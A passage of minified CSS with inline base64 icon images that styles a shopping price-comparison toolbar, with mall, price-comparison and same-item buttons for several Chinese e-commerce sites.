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);cursor:pointer;width:42px}.dypTop9527-mini:hover{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACoAAAAgCAMAAABThhoPAAAAe1BMVEX0eJLjb4fzeJF/P01+P0wAAAD2eZPu7u7////7ztj/+vv6u8j4mq7+9vj3j6X6ws73lqv5rb34orTrWXD83eT97vH71d33i6H3h532gJn84Obt3eD5scD5sL/srbjqiJfrYHf96+/96O37y9X6yNP6x9L4qbr4nbDrlKKJ1KDYAAAABnRSTlP0vPJNTCl/weFRAAAAy0lEQVQ4y9XT2Q6CMBCFYdzqcYHSFgFBFnff/wlNBSRhhtjEG/0vmy/NDIsnPrR89380AJNiabJbk3z97QBKbkhyw1Kw7Rka8vTA0JinO0pTjKQJvY7RiFB/jPoNrYwxVUMvzRLH10Vn2ArYsobmtanzdq0MQCyUvScRJwBSSLtW0A5QmrL/BkJ7mqqbfZRaBd1RN+tj2VMtSPrOvq0IW0IBlq4QUur/Kk1daYxiOwxrlkowRSzdyxVJJkPquf+GE3c6mzrTxXziudEnBCso1OV6//4AAAAASUVORK5CYII=)}.dypTop9527-logo b{width:40px;height:40px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAyCAMAAAAZbWmiAAACH1BMVEUAAAD8rF72IVD+RIb8ql7+QoX8ql7+WXD9hGb+PX35oFD8iGT+sGP+R4r7qFr8rF7/MHn6MWz3JFf/Nnf/L3j/Nnj+Ym7/LHX+O4n/VHj8rlz/M37+gWb+v1v2IVP4KF76pVX2l0fzhzj9dmn/L3n+Ym3/P3X+LnX6pVP9eGn/QHX+SXP+UnH+bGv0jT77KGb/LXX9kmP8s1v6pFL/Lnf+MYv8m2H8l2L9d2n+Y27+PIb+LXT8slv9gWf+bGv8rVf/Lnb6jlf9OHX1jkL8L3H9N3n7NnT8K2z/O5nyGUH+SHj9k2PziTr3JVr+SG/8vlfwlSr+WXD9bmv8q17+Lozwjyr8pF/+Wm/+NIr3mUj8q178oGD9gWf+Lo76uk/4Jlv4nk7/NJP8v1f1kkP+X27+Q4X9f2j+X27/L3n+VHH6KGT9M4Twjy3+WnD2l0f+cmf9iGX0jD39j2T8q17+VHH4Jl34nUz9eGb8mWLxjzD5olD+Pof9kGT+aWz+aW38r138oWD+Q4X8q171jj/8KWr2lUX7KGX4JVr3IlX5JV7+Roj6J2L4nUv1kkL/L3n+K3H3mkjzijv/SY/5ok//LHX9rmH0HUrziDb/QYj/NHf9K23+a2z/R4v/Onf/QHX+THT+X2/+ZG39lmL8ql3/PJD+OIn/O4D+RnT+UW/9dmn9jGT9kWP8nWH8pV/8rlz6pVL1I1H+Lo38s1vyGkLykTI0Bu+8AAAAgXRSTlMAV/JXz/4P/v76+gX+/Pv6+fny6NLPz2hYOB4cCf37+vr68u/s6uji4dHPz8/Puq6inIqFeXRyamJQTkZGQDg0LBsUEvr5+fTz8fDv6+nk4+Pi4d/e3NbPzsrHxMO+vbetpaKhoJmXkZCLioiGgHp3dGRjYWBdVVRSUkVAMC8iGA69K3CeAAACT0lEQVRIx+3P11oaQRgG4ImEiKC0SBGINcZYY4u9m95777333nfpxUU6hCAKGmvUlAvMzOwusAsX4IHfyT/zP+8z3y5Yz1rP66uHlUplHp39eQ/B6crKQ03Ps9wOu91qtdpgVleDf63TJaOhkMdjNDbx3AOnMyWDQYV3H3iEHMxNjhuxWFIyWFrgdVwHx7AbGzMPZ0KNiZW2YJnQS4Q/gn+MMz/hfCGEWNpKFd4fBDEN3ocYZz6fCfeasLTbymAtQRCXwRVjiHbj46Np1/vdhKTTqoC1MGEt2EJWeIzYud6kYbMbSad9TxGshZmRDC4HCsXwRehc19Kwxg2lxYRqcU6BGyRJFkorzNC5xBLWDfkR3CVEz+HshM1IysQQ+nwfWNju97tNu4scrJsZ0f0hUQKBcgTbWFgMXyxIO+I3aEUMU6nY59vOOL3fLRcilm4+mkxJWblvZZCGGv9PR6Y7B/qWyYxIV9qYZujCYZYKbwOga5VlyiTT3SMQCA7EBShabY8e7772bcB5SZ5EA6RyZA7kDnmBe982i4fh6Vtm0dmBxyZyIw9O4HFrKjqADy8WE5054WYaPp6s/oIP/QuJd7lhjJ7Hq5nFQgtdneTDCD1L8u/ieUlkoOEvHtzKQHA/X9090FU130Vfv2VBij29yp+cip7oZ26SpTNcWIMhU9/9OXXWLV3kwntUO8iVlkQHd6GnKE02kzxbPGjg7XopSl6sUqnq6urrGxrOqtWNjbW1IpHoE+BnqFlOUZFILDYxG4/PoT+KzlfdGQbrWev5D9cYC/go9falAAAAAElFTkSuQmCC) center;cursor:pointer}.dypTop9527-mall{display:flex;align-items:center;justify-content:center;width:110px;position:relative;cursor:pointer;box-sizing:border-box}.dypTop9527-mall>span{font-size:13px;height:40px;line-height:42px;color:#333}.dypTop9527-mall>b{height:19px;width:23px;margin-right:6px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAATCAMAAABMZWaEAAAAgVBMVEUAAAD+JlD+JlH/JlH9JlH+jKL/LlL/KVL/J1H+JlH+JlH+JVD+JVD+Wnn/J1D+J1H/J1D/J1H/K1X/J1X/Ll3+JVH9J1H/J1D/J1H8JlL8J1H/J1L/KVL9JVD+kqf////+Wnr/1d3/zdf/v8v/sMD/obT+hJz+dZD+ZoX+Sm7+R2t42bHDAAAAHXRSTlMAgOd3pfEcGWL57NbCoG9bSjoqJwuzkXxoUU9BMltoPywAAACXSURBVBjTbdA3FsIwEEXRr2DLNuBMxiLH/S8QaQofPvCKKa40zUBKrdY2BRVZG+eM/nmwJk5jv127OJ0mzIphrMhG7vPho7yHUstN8HagWqhQBzTsp733yawBavZzcJ9sgYr9Et3XQMl+FV8Dit2LV8CC/SaeAZb9Lr4C5uwP8RKYsh/EDTBhf4qr//8TA+xo4XWUO3R4A/hOIdJZFlAiAAAAAElFTkSuQmCC) center no-repeat}.dypTop9527-mall:hover{border-color:#D5D5D5;background:linear-gradient(#eee,#fff)}.dypTop9527-mall:hover .dypTop9527-mask{border-color:#f3f2f2}.dypTop9527-mallDrop{position:absolute;left:-39px;top:36px;padding-top:5px;margin-left:-1px}.dypTop9527-mallDrop ul{background-color:#FFF;width:590px;border:1px solid #D5D5D5;border-top:none;box-sizing:border-box}.dypTop9527-mallDrop li{float:left;border-right:1px solid #f3f2f2;border-bottom:1px solid #f3f2f2}.dypTop9527-mallDrop a{display:block;height:59px;width:83px;line-height:37px;color:#545454;text-align:center}.dypTop9527-mallDrop a:hover{background-color:#ececec}.dypTop9527-mallDrop img{display:inline-block;width:26px;height:26px;vertical-align:-11px}.dypTop9527-bijia,.dypTop9527-sameStyle>div{align-items:center;display:flex;cursor:pointer;box-sizing:border-box}.dypTop9527-mallDrop h5{line-height:16px}.dypTop9527-sameStyle-topMask,.dypTop9527-topMask{position:absolute;border-top:2px solid transparent;top:0;left:0;width:100%}.dypTop9527-rMask{position:absolute;background:#eee;top:6px;right:-2px;width:2px;height:28px}.dypTop9527-mask{position:absolute;border-top:1px solid #D5D5D5;bottom:-1px;left:0;width:100%}.dypTop9527-bijia{justify-content:center;width:110px;position:relative}.dypTop9527-bijia-rMask{position:absolute;top:6px;right:0;width:6px;height:28px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAYAAAAcCAYAAABCgc61AAAAAXNSR0IArs4c6QAAAJJJREFUKBVjYMAC3r9//48JizhYaKhL/P//nx2IGZmRPfj8+XPRX79+7QCKFcLF3759q/3u3bv7wOCoAwuCtAEFPIH4NVAyHK7y9evX3kDBN0BgChcEMpDDihFZggFmFNDsVyhGwVShW46iHeRcNja2jUBTemAa4DRQkB3omP/IloMlGRkZfwIxpgRMK4aOwS0BAP3RWAyuUF4OAAAAAElFTkSuQmCC)}.dypTop9527-bijia>b{height:19px;width:23px;margin-right:6px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAARCAMAAADwppwCAAAAe1BMVEUAAAD+JlD/J1H+JVD9JlH/J1H/J1H/J1H/KVL+KFP9K1T0Llf/M2b+JVD9JVH9JVH/JlD/JlH/J1D/MFv+JlH+JlH+JVD+JVH+JVH+JVD9JVD9JlL9JlH/JlD/J1D+J1H/KVH7KVb/LVrhYYD+JlH9JlD7KFD/KFH+JVBBoAhRAAAAKHRSTlMAgHz5mEtBMisgFwsG9aWddllSDuXUyMK8sY6Gg2dfUUUcEQLsqEAllpkzYwAAALRJREFUGNNtkNkOglAMRGeu7KBsirJvLvf/v1BqIGBgHpp0TtJpC8BSJEf+ywQQqUmj2op0cSiPDi4nrTWmsiqDz2iydiCByTf0HjhIVLCCuNTaMqS7wmeH6wKMIDOCm3Q1HMZI82VU26eF+GcfCQegmUFtA1Yo5AGXNrz7DMLKsytp9AU9GzyXDJqpZ71kVICW7rpVXrq28Qsv8KGzvcOMpEqGr+KDA88DRAcv6cQ/emIo/hf9lCM8oqkR9QAAAABJRU5ErkJggg==) center no-repeat}.dypTop9527-bijia>span{font-size:13px;height:40px;line-height:42px;color:#333}.dypTop9527-sameStyle>div{margin-left:9px;justify-content:center;height:40px;padding:0 6px;position:relative}.dypTop9527-sameStyle>div:hover .dypTop9527-sameStyle-topMask{border-color:#FD2550}.dypTop9527-sameStyle>div:hover{background:linear-gradient(#eee,#fff)}.dypTop9527-sameStyle>div:hover .dypTop9527-mask{border-color:#fff}.dypTop9527-sameStyle>div>span{font-size:13px}.dypTop9527-sameStyle b{height:16px;width:16px;margin-right:4px;opacity:.5;background-size:cover}.dypTop9527-sameStyleDrop-icon,.dypTop9527-vipCouponDrop-icon{height:14px;width:14px;position:absolute;margin-top:2px;background-size:cover}.dypTop9527-sameStyle>div:hover b{opacity:1}.dypTop9527-sameStyle b.tm,.dypTop9527-sameStyleDrop-icon.tm,.dypTop9527-vipCouponDrop-icon.tm{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAIVBMVEXnIQkUAQBsCgLnIQnnIQkAAAD///+/GQWSEAMzAgApAgBkBkEFAAAABHRSTlPa/VEeHsmOkgAAADxJREFUCNdjMHABA2YGFgjDgcEFCoCMNCBAZbi4pbiQyphVAjLOfSVDaASI0RrKEAoFDKIQOpBBFcIIAgAvbCXKUBf6NQAAAABJRU5ErkJggg==)}.dypTop9527-sameStyle b.tb,.dypTop9527-sameStyleDrop-icon.tb,.dypTop9527-vipCouponDrop-icon.tb{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAABEVBMVEX/RQD/VQD/VAD/RQD/RQD/VQD/VQD////+RgD/RQD/QwD/SgD8////UwD/TQD/PQD/MwD/LAD/UQD/LgD90sH+49X92sn9y7P8n3z8eUb/QQH/PwD/OgD/OAD9/Pr9+fb+9vH+7ev+6N780bz9z7b9zLb8xrL+wqv+w6b7r5b8rYv+qYT9nXX9mXL+knH9lmn8j179iVb+hFL+gEv8fkX8ZTn9bin9ZCn+UBL+PgX/TQL+RwD/DAD+/fj+8uj91cT+0cT8yav8vaX9uJr+spH8ooz9m4f9lHn8onD7m2v7kGr8iWj9cFL+d079cjT8WDH9aC/9WS37ayr9WSH/Zx78Yxr+Wg3/Vwz7OgD8LAD/AQBbThY0AAAABnRSTlPn5ublSkmb2EzAAAAA3klEQVQY003BBW4DMRAAwA3dXmzHcIxhZuYyM+P/H1KpUqTMQCah7UlkIKlxovHQ0HL/kmBw/hF8zokpRSypZgCPXOYP2fDqpF4dEJIDI+6UbsrIKv2HHrNCCvxr+l0tuPgav6+aOI9ALFjTH9VqRbt1d44TCTSY5cdTp4v2/dMZjk1YG79tZ3ZhoV33OjhSsFbL/PVxn+DAO+3ixITo5bDwc4BHWHLLFj6aoNqst31uOJfebYsVVwKyxF8Sqcztwqo03iQFSpSgG51QEehK0g2k9J1QEF0HSEN2Tyr9BwwsHAF+24CqAAAAAElFTkSuQmCC)}.dypTop9527-sameStyle b.jd,.dypTop9527-sameStyleDrop-icon.jd{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAkFBMVEXIFiLGCxjIFiLIFiLIFiLDAA3JFSH///++AADKFyTAAADPND3IDxu6AAD88fHhe4L79PPrqKzqpKnkjZPQN0DOLjjIEx/GExnFChLDAAvDAAnzzc/ooaTnmp7lk5fjio/ihYvhgYXfd37fdnzHCxe9AAD7+fb22Nn01dPdcHfaZW3VU1jTRk/MJC/FDxXFAg+thuh3AAAABnRSTlPy8ufaQvJeQstuAAAAnklEQVQY02XP5xKCMBAE4FDMXoDQuzRB7OX9304TcUaH+/nN3N0usy32M5bNTP43JmOciyd5DhFVXHCmoLwN90sXBxnthQZKkPo4AL3jaXACuGEjiwQ70kAK4rmWW5TGF/yIBI3INnplRKph+oAnz2+I52pZyaviiAKNfPT6qOGdgKsDhECn3hp5m7iUT200uEswoloIFb1W0VflVvVfDrkLeWhVic0AAAAASUVORK5CYII=)}.dypTop9527-sameStyle b.wph,.dypTop9527-sameStyleDrop-icon.wph{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAANlBMVEXhBn/hBn/hBn/hBn/3wd/wg7/pRJ/////50Of97/flJY/yksfuc7fjFof0oc/sZK/74O/qVKezyetHAAAAA3RSTlPmSklSjzZ3AAAAaUlEQVQY022P2w6AIAxD1a1zA7z9/886CBAwNntYT9qHLttCg9y6H9X9+SCVxwEACnb4VXBjJyjAgBTAtB+WJKlIaOA0IWEvNICorMZ8NUCoiX+g4mCsGH8SkXgGrlzJin2MhD5uneevL3TKBHUFamRIAAAAAElFTkSuQmCC)}.dypTop9527-sameStyle b.dd,.dypTop9527-sameStyleDrop-icon.dd{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAA51BMVEX/PAb/PAb/PAb/PAb/OAL/OgT+////NgX+8u788Or8sJz/NAL++ff+18390sb9y7v8xbb7wK79oor7h2f8a0L+Qhb9PhP+Pgv8NAn89fL+4db908b7qZj7l3v5lHj7j3H6i2z8hGL6cU78bkv8Yjn8WDj8TB7+PR39SBr+Lxf9ORT+OQn5MgX+KQD7/Pz8/Pr67OX+49n629H92878z8P9zMD7t6X6rZb1opD8oYz6nIL7fFr6eFr9bUz7ZEr9XT76Wz37UzPuTir9Pif9UiX8UyL7QRr+QhH+KRH3Ogv+Ngv/PAr9OAbBX6t7AAAAA3RSTlPnSeTQB9DWAAAAw0lEQVQY01XM1Q7CQBCFYcpsd+tCqeDu7u4u7/88DNuEhLmZ/N/FiQgRABGAEP4wsVVGoFoHwlQU7NcqU3ct5elmCz4KiO4wsT1Jo8Ze7t84+KX8Ok21RdEpAwLuebGEPDZkafnmIKo5qlQ8b2fTWAgs7vgdxjqBRc9fIHHTMlNGym6WNCcEY6InkwOzudEKfLRVzF0btdq9bdMLBzUvpQ9BUJniKAexOuvKui715o8QgLTKGUXJHtvwBZTf8Rb+JCp8AAc7EhZuaPtRAAAAAElFTkSuQmCC)}.dypTop9527-sameStyle b.sn,.dypTop9527-sameStyleDrop-icon.sn{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAABI1BMVEU0LCo0LCo0LCozKyk0LCo1LSouKCs4Lin///8NEDAYFy4fHCxJOycvJyf/xQD/wQAJDTEcGS0pJSr6uAD/7qBDOzkVFi8kIC0uJSC9jQ7/0QD/ygD/vgD4swDkoQBSQSduVSEnHx6FYxzCkA/tsAf/4QD/1gD/zQD2qADv+/+7yOa1vd+7wtb//87e28j/9sb/7pn/9Iz+5Yv/72//421ZWmHLqE3/6EpBPkkABTM5MTAMEC/+zS4iHy1GOyoUEydkTyX/4CR6XSF2Xh//zB2PbRgjGhiiexeughRtUxQDARPHmBG3kBC9mA8bEg/HpwzQmgwKCgzdpAq8iQj+zwb1vQX/5wD8wQD/uwD/twD9rgDOkQDBgACicACobgCZaABwSwB+2FDjAAAABHRSTlPmSknnIl/z/wAAAOVJREFUGNMdj+VywzAQhJVWLFkyxY4xabjMzMzM3Pd/ikq+P7e7t3MzHxgB0AzxBURmGwugVQJLD9uL9QRzFl8+HbhcEIRMgPHp1cNA6eS6JZyGCbxm2ldF8TZ4uYscB0CyKXWugkLrrOPahh8nWfdxGHx21HOL3wDIznpB+R1Or/y8qrR5ASBvp8HH0sTkzNEw6zbWzFPWzhfo8v0U3SrRbh1AFMn3WUrHKV39YhsnpiFkvj8fhnOLvSQaq1sSf+/8V/fLv8MdvwoQ4q57fCvXWUycCsbieN42sWoU1KoEQQwr2No/KisZVa4dRvMAAAAASUVORK5CYII=)}.dypTop9527-sameStyle 